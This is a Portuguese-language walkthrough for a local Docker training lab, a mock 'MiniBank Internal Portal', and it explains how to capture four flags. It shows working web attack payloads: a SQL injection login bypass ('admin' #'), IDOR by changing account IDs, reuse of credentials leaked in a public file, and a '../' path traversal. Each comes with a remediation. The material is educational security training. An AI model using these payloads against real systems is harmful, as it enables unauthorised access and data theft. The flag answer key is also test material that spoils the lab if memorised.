# Walkthrough - web-basic-01

Este walkthrough ensina como validar o lab **web-basic-01**, baseado na aplicacao **MiniBank Internal Portal**.

O foco desta fase sao quatro vulnerabilidades principais com flag:

- SQL Injection no login
- IDOR em contas
- credencial vazada em arquivo publico
- Path Traversal / LFI controlado

`robots.txt`, `/health`, comentario HTML, `/admin` e `/backup` existem como pistas de enumeracao e validacao de impacto, mas nao possuem flag propria.

## 1. Preparacao do ambiente

Entre na pasta do lab:

```bash
cd web-basic-01
```

Suba os containers:

```bash
docker compose up --build
```

O esperado e o Compose iniciar:

- a aplicacao web na porta `8080`
- o MySQL na rede interna do Docker, sem expor `3306` no host

Valide a pagina inicial:

```bash
curl -i http://localhost:8080
```

Voce deve receber HTTP `200 OK` e HTML contendo **MiniBank Internal Portal**.

Valide tambem o healthcheck:

```bash
curl -i http://localhost:8080/health
```

O retorno esperado e JSON com informacoes verbosas, como nome da aplicacao, versao, ambiente, path interno e banco interno. Ele e uma pista de enumeracao, nao uma flag.

## 2. Enumeracao inicial

Comece observando sem autenticacao. O objetivo e entender o que a aplicacao revela antes de testar payloads.

```bash
curl -i http://localhost:8080
curl -s http://localhost:8080 | head
curl -s http://localhost:8080 | grep -i "admin\|robots\|backup\|dev"
```

Observe:

- titulo da aplicacao: `MiniBank Internal Portal`
- link visivel para `/login`
- link visivel para `/health`
- tema de portal interno antigo
- possiveis comentarios HTML

Tecnologias aparentes:

- HTTP/HTML renderizado no servidor
- Express/Node.js
- sessao via cookie apos login
- MySQL indicado pelo healthcheck

Teste uma rota inexistente:

```bash
curl -i http://localhost:8080/nao-existe
```

O comportamento de erro ajuda a identificar padrao de respostas e confirmar que a aplicacao trata rotas no backend.

## 3. Healthcheck verboso

Com `jq`, se disponivel:

```bash
curl -s http://localhost:8080/health | jq
```

Sem `jq`:

```bash
curl -i http://localhost:8080/health
```

O healthcheck atual revela:

```json
{
  "status": "ok",
  "app": "MiniBank Internal Portal",
  "version": "1.4.2-dev",
  "env": "development",
  "internal_path": "/usr/src/app",
  "database": "mysql://minibank-db:3306/minibank"
}
```

Por que isso e suspeito:

- vaza ambiente (`development`)
- vaza versao (`1.4.2-dev`)
- vaza path interno (`/usr/src/app`)
- vaza host e servico de banco (`minibank-db:3306`)

Impacto: ajuda fingerprinting e mapeamento da arquitetura.

Correcao: healthchecks publicos devem retornar apenas status minimo, como `{"status":"ok"}`. Diagnosticos detalhados devem ser internos, autenticados ou restritos por rede.

## 4. robots.txt

Acesse:

```bash
curl -i http://localhost:8080/robots.txt
```

Conteudo real:

```text
User-agent: *
Disallow: /admin
Disallow: /backup
Disallow: /dev-notes.txt
Disallow: /download
```

Por que e util em pentest web:

- lista caminhos que a equipe nao quer indexar
- pode revelar endpoints legados
- pode indicar arquivos esquecidos
- orienta a proxima etapa de enumeracao

Importante: `robots.txt` nao e controle de acesso. Ele apenas orienta crawlers.

## 5. Comentarios HTML suspeitos

Procure comentarios:

```bash
curl -s http://localhost:8080 | grep -i "<!--"
```

Comentario real:

```html
<!-- legacy admin panel moved to /admin, check robots.txt before release -->
```

O que observar:

- menciona painel admin legado
- confirma `/admin`
- manda verificar `robots.txt`

Impacto: comentarios HTML podem revelar rotas antigas, TODOs, paineis internos, arquivos esquecidos e detalhes de ambiente.

Correcao: nao enviar comentarios operacionais no HTML publico. Informacoes internas devem ficar em documentacao interna ou no repositorio, nao na resposta ao cliente.

## 6. Credencial vazada em arquivo publico

O `robots.txt` aponta para `/dev-notes.txt`. Acesse:

```bash
curl -i http://localhost:8080/dev-notes.txt
```

O arquivo publico contem:

```text
backup_user:backup123
endpoint antigo: /backup
FLAG{credencial_exposta_capturada}
```

Flag:

```text
FLAG{credencial_exposta_capturada}
```

Como validar impacto:

```bash
curl -i http://localhost:8080/backup
curl -i -u backup_user:backup123 http://localhost:8080/backup
```

Sem credencial, `/backup` deve responder `401`. Com `backup_user:backup123`, deve responder `200 OK` e listar relatorios antigos. A rota `/backup` valida o impacto da credencial vazada, mas nao possui flag propria nesta fase.

Impacto:

- arquivo estatico publico exposto
- credencial reutilizavel
- acesso a area legada

Correcao:

- remover arquivos sensiveis de `public`
- rotacionar credenciais expostas
- usar variaveis de ambiente ou secret manager
- revisar pipeline para impedir publicacao de notas internas

## 7. SQL Injection no login

Rota real:

```text
POST /login
```

Valide primeiro um login legitimo:

```bash
curl -i -c joao.cookies \
  -d "username=joao&password=joao123" \
  http://localhost:8080/login
```

Depois confirme o dashboard:

```bash
curl -s -b joao.cookies http://localhost:8080/dashboard | grep -i "joao\|employee\|contas"
```

Agora valide um login incorreto:

```bash
curl -i \
  -d "username=admin&password=senha_errada" \
  http://localhost:8080/login
```

O esperado e `401`.

O codigo vulneravel concatena entrada do usuario na query:

```js
const sql = "SELECT id, username, role FROM users WHERE username = '" + username + "' AND password = '" + password + "' LIMIT 1";
```

Payload funcional:

```text
username: admin' #
password: qualquercoisa
```

Exemplo com `curl`:

```bash
curl -i -c admin.cookies \
  --data-urlencode "username=admin' #" \
  --data-urlencode "password=qualquercoisa" \
  http://localhost:8080/login
```

Por que funciona:

- `admin'` fecha a string de usuario como `admin`
- `#` inicia comentario no MySQL
- a verificacao de senha fica comentada
- a aplicacao cria sessao para o usuario `admin`

Valide a flag no dashboard:

```bash
curl -s -b admin.cookies http://localhost:8080/dashboard | grep -i "FLAG"
```

Flag:

```text
FLAG{sqli_capturada}
```

Impacto: bypass de autenticacao e acesso como admin sem conhecer a senha.

Correcao:

- prepared statements
- queries parametrizadas
- hash forte para senhas
- validacao de entrada
- tratamento uniforme para erros de login

## 8. IDOR em contas

Rota real:

```text
GET /account/:id
```

A aplicacao exige login, mas nao valida se a conta acessada pertence ao usuario logado.

Faca login como Joao:

```bash
curl -i -c joao.cookies \
  -d "username=joao&password=joao123" \
  http://localhost:8080/login
```

Contas reais no banco:

- `/account/1` - Joao Silva
- `/account/2` - Maria Oliveira
- `/account/3` - Carlos Backup
- `/account/4` - Admin User
- `/account/5` - Joao Silva - Reserva

Acesse uma conta do Joao:

```bash
curl -s -b joao.cookies http://localhost:8080/account/1 | grep -i "Joao\|Conta\|Nota"
```

Troque apenas o ID:

```bash
curl -s -b joao.cookies http://localhost:8080/account/2 | grep -i "Maria\|FLAG\|Nota"
```

Flag:

```text
FLAG{idor_capturada}
```

Por que funciona: a query busca `accounts WHERE id = ?`, mas nao filtra por `user_id` do usuario autenticado.

Impacto:

- acesso indevido a contas de outros usuarios
- vazamento de saldo, numero de conta e notas internas
- quebra de autorizacao horizontal

Correcao:

- verificar o dono do recurso no backend
- filtrar por `id` e `user_id`
- criar regras explicitas para perfis administrativos
- adicionar testes de acesso cruzado entre usuarios

## 9. Path Traversal / LFI controlado

Rota real:

```text
GET /download?file=
```

Teste primeiro um arquivo permitido:

```bash
curl -i "http://localhost:8080/download?file=public-info.txt"
```

Tambem existem:

```bash
curl -i "http://localhost:8080/download?file=report-q1.txt"
curl -i "http://localhost:8080/download?file=report-q2.txt"
```

O problema e que a aplicacao monta o caminho com o parametro `file` sem garantir que o resultado permanece em `/usr/src/app/files`.

Dentro do container, a base e:

```text
/usr/src/app/files
```

Para chegar em `/flags/final.txt`, suba quatro niveis:

```bash
curl -i "http://localhost:8080/download?file=../../../../flags/final.txt"
```

Flag:

```text
FLAG{path_traversal_capturada}
```

Impacto:

- leitura de arquivo fora do diretorio esperado
- vazamento de segredos
- exposicao de configuracoes ou codigo dentro do container

Correcao:

- usar allowlist de arquivos
- normalizar e resolver caminho absoluto
- bloquear `../`
- garantir que o caminho final continue dentro do diretorio permitido
- evitar aceitar paths arbitrarios do usuario

## 10. Lista final de flags

As quatro flags reais do `web-basic-01` sao:

- `FLAG{sqli_capturada}`
- `FLAG{idor_capturada}`
- `FLAG{credencial_exposta_capturada}`
- `FLAG{path_traversal_capturada}`

Nao ha flag propria em `/admin`, `/backup`, `/health`, `robots.txt` ou comentario HTML.

## 11. Checklist de validacao manual

- [ ] `docker compose up --build` sobe sem erro dentro de `web-basic-01`
- [ ] `http://localhost:8080` responde
- [ ] `/health` responde e serve como pista
- [ ] `/robots.txt` existe e lista rotas suspeitas
- [ ] comentario HTML aparece no fonte
- [ ] `/dev-notes.txt` existe e contem credencial vazada
- [ ] `FLAG{credencial_exposta_capturada}` aparece em `/dev-notes.txt`
- [ ] credencial `backup_user:backup123` acessa `/backup`
- [ ] SQL Injection permite login como admin
- [ ] dashboard admin mostra `FLAG{sqli_capturada}`
- [ ] IDOR permite acessar `/account/2` como Joao
- [ ] `/account/2` mostra `FLAG{idor_capturada}`
- [ ] `/download?file=../../../../flags/final.txt` mostra `FLAG{path_traversal_capturada}`
- [ ] somente as quatro flags oficiais foram coletadas

## 12. Como corrigir cada vulnerabilidade

SQL Injection:

- trocar concatenacao de SQL por prepared statements
- usar queries parametrizadas
- armazenar senhas com hash forte
- validar entrada e padronizar respostas de erro

IDOR:

- verificar autorizacao por recurso
- garantir que `account.user_id` bate com o usuario logado
- nao confiar no ID da URL como prova de permissao
- testar acessos cruzados

Credencial vazada:

- remover arquivos sensiveis de `app/public`
- rotacionar credenciais expostas
- usar variaveis de ambiente ou secret manager
- bloquear publicacao de notas internas

Path Traversal:

- usar allowlist de arquivos
- normalizar paths
- bloquear `../`
- validar que o caminho final continua dentro da pasta permitida

Healthcheck verboso:

- retornar somente status minimo
- remover path interno, versao detalhada e dados de banco
- separar healthcheck externo de diagnostico interno

Comentarios HTML e `robots.txt`:

- remover comentarios operacionais do HTML publico
- nao tratar `robots.txt` como controle de acesso
- proteger rotas sensiveis no backend
